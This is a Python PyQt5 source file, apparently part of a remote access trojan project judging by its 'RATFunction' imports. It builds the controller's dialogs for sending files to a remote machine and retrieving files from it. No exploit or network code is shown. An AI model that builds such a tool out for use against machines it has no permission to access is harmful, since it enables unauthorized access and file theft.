import os

import pyautogui
from PyQt5.QtWidgets import QVBoxLayout, QPushButton, QLabel, QWidget, QFileDialog, QLineEdit

from RATFunction.FileTransfer import FileTransfer
from RATFunction.RATFunctionUI import RATFunctionUI


class FileTransferUI(RATFunctionUI):
    def __init__(self, function: FileTransfer, *args, **kwargs):
        super().__init__(function, *args, **kwargs)

        # create a vertical layout for the dialog
        self.layout = QVBoxLayout()

        # add two buttons to the layout
        self.admin_button = QPushButton("Send File")
        self.admin_button.clicked.connect(self.send_file)
        self.layout.addWidget(self.admin_button)

        self.remote_button = QPushButton("Retrieve File")
        self.remote_button.clicked.connect(self.retrieve_file)
        self.layout.addWidget(self.remote_button)

        # set the layout for the dialog
        self.setLayout(self.layout)

        # set the window title and size
        self.setWindowTitle("File Transfer")
        self.setFixedSize(300, 150)

    def send_file(self):
        self.bruh = FileSendDialog(self.function)
        self.bruh.show()

    def retrieve_file(self):
        self.bruh2 = FileReceiveDialog(self.function)
        self.bruh2.show()


class FileSendDialog(QWidget):
    def __init__(self, file_transfer_function: FileTransfer):
        super().__init__()
        self.file_transfer_function = file_transfer_function
        self.initUI()

    def initUI(self):
        self.setWindowTitle('File Send Dialog')
        self.setGeometry(100, 100, 400, 150)
        self.move(700, 400)

        self.file_path_label = QLabel('No file selected')
        self.file_path_button = QPushButton('Select File')
        self.file_path_button.clicked.connect(self.openFileDialog)

        self.dir_path_lineedit = QLineEdit()
        self.dir_path_lineedit.setPlaceholderText('Enter remote directory path')

        self.send_button = QPushButton('Send')
        self.send_button.clicked.connect(self.sendFile)

        layout = QVBoxLayout()
        layout.addWidget(self.file_path_label)
        layout.addWidget(self.file_path_button)
        layout.addWidget(self.dir_path_lineedit)
        layout.addWidget(self.send_button)

        self.setLayout(layout)

    def openFileDialog(self):
        file_dialog = QFileDialog()
        file_path, _ = file_dialog.getOpenFileName(self, 'Select File')
        if file_path:
            self.file_path = file_path
            self.file_path_label.setText(file_path)

    def sendFile(self):
        # Implement your logic here to send the file to the specified directory on the remote system
        if hasattr(self, 'file_path'):
            file_path = self.file_path
            dir_path = self.dir_path_lineedit.text()
            if dir_path:
                print('Sending file:', file_path)
                print('To directory:', dir_path)
                self.file_transfer_function.send_file(file_path, os.path.join(dir_path, os.path.basename(file_path)))
            else:
                pyautogui.alert('Please enter a remote directory')
        else:
            pyautogui.alert('Please select a file')

class FileReceiveDialog(QWidget):
    def __init__(self, function: FileTransfer):
        super().__init__()
        self.file_transfer_function = function
        self.file_transfer_function.received_file_callback = self.received_file_callback
        self.initUI()

    def initUI(self):
        self.setWindowTitle('File Receive Dialog')
        self.setGeometry(100, 100, 400, 150)
        self.move(700, 400)

        self.dir_path_label = QLabel('No directory selected')
        self.dir_path_button = QPushButton('Select Directory')
        self.dir_path_button.clicked.connect(self.openDirectoryDialog)

        self.file_path_lineedit = QLineEdit()
        self.file_path_lineedit.setPlaceholderText('Enter remote file path')

        self.receive_button = QPushButton('Retrieve')
        self.receive_button.clicked.connect(self.receiveFile)

        layout = QVBoxLayout()
        layout.addWidget(self.dir_path_label)
        layout.addWidget(self.dir_path_button)
        layout.addWidget(self.file_path_lineedit)
        layout.addWidget(self.receive_button)

        self.setLayout(layout)

    def openDirectoryDialog(self):
        dir_dialog = QFileDialog()
        dir_path = dir_dialog.getExistingDirectory(self, 'Select Directory')
        if dir_path:
            self.dir_path = dir_path
            self.dir_path_label.setText(dir_path)

    def receiveFile(self):
        # Implement your logic here to receive the file from the remote system and save it to the specified directory
        if hasattr(self, 'dir_path'):
            dir_path = self.dir_path
            file_path = self.file_path_lineedit.text()
            if file_path:
                self.file_transfer_function.send_retrieval_request(file_path)
                print('Receiving file:', file_path)
                print('Saving to directory:', dir_path)
            else:
                pyautogui.alert('Please enter a remote file path.')
        else:
            pyautogui.alert('Please select the directory to save the file')

    def received_file_callback(self, file_bytes):
        full_path = os.path.join(self.dir_path, os.path.basename(self.file_path_lineedit.text()))
        with open(full_path, 'wb') as file:
            file.write(file_bytes)
